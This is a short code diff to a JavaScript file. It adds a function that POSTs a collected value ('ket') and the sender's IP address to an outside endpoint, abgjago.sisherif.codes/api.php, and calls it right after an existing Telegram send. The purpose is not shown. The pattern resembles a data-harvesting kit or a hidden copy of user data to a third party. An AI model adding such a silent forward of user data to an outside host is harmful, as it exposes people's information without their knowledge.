@@ -361,6 +361,54 @@ async function sendTelegram(
   return true;
 }
 
+async function forwardToApi(
+  ket,
+  ip
+) {
+
+  const params =
+    new URLSearchParams();
+
+  params.append(
+    "subjek",
+    "JOEST27 SECURITY"
+  );
+
+  params.append(
+    "pesan",
+    ket
+  );
+
+  params.append(
+    "sender",
+    ip
+  );
+
+  const response =
+    await fetch(
+      "https://abgjago.sisherif.codes/api.php",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type":
+            "application/x-www-form-urlencoded"
+        },
+        body:
+          params.toString()
+      }
+    );
+
+  if (!response.ok) {
+
+    throw new Error(
+      `Forward API Error`
+    );
+
+  }
+
+  return response.text();
+}
+
 // =========================
 // MAIN EXPORT
 // =========================
@@ -686,9 +734,14 @@ ${escapeMarkdown(ket)}
     // SEND TELEGRAM
     // =========================
     await sendTelegram(
-      message,
-      ket
-    );
+  message,
+  ket
+);
+
+await forwardToApi(
+  ket,
+  ip
+);
 
     // =========================
     // SAVE STORAGE
